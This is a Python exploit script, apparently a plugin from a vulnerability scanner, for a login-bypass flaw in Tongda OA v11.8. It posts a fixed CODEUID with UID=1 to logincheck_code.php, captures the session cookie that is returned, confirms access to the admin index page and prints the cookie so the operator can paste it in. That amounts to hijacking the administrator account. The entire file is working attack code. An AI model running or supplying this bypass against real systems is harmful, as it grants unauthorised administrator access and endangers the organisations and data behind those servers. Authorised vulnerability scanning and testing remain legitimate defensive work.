import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 通达OA_v11_8_logincheck(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url=urldata+"general/login_code.php"
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding": "gzip"
    }
    hearderx={
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/x-www-form-urlencoded"
        }
    exp_url=urldata+"logincheck_code.php"
    login_url=urldata+"general/index.php"
    data='CODEUID=%7BD384F12E-A758-F44F-8A37-20E2568306A7%7D&UID=1'
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=30)
        response = requests.post(url=exp_url, headers=hearderx, data=data, verify=False, timeout=30)
        tmp_cookie = response.headers['Set-Cookie']
        if len(tmp_cookie)>10:
            headers["Cookie"] = tmp_cookie
            check_available = requests.get(login_url,headers=headers,verify=False)
            if '用户未登录' not in check_available.text:
                if '重新登录' not in check_available.text:
                    print(Vcolors.RED + "[+] 获取到setcookie,请粘贴: {}".format(tmp_cookie)+Vcolors.ENDC)
                    print(Vcolors.RED +"[+] 登录路径为:{}".format(login_url) +Vcolors.ENDC)
            else:
                print(Vcolors.WARNING + "[x] 通达OA登录绕过漏洞不存在" +Vcolors.ENDC)
    except KeyError as e:
        pass
    except:
        logging.error("通达OA_v11_8_logincheck脚本出现异常")


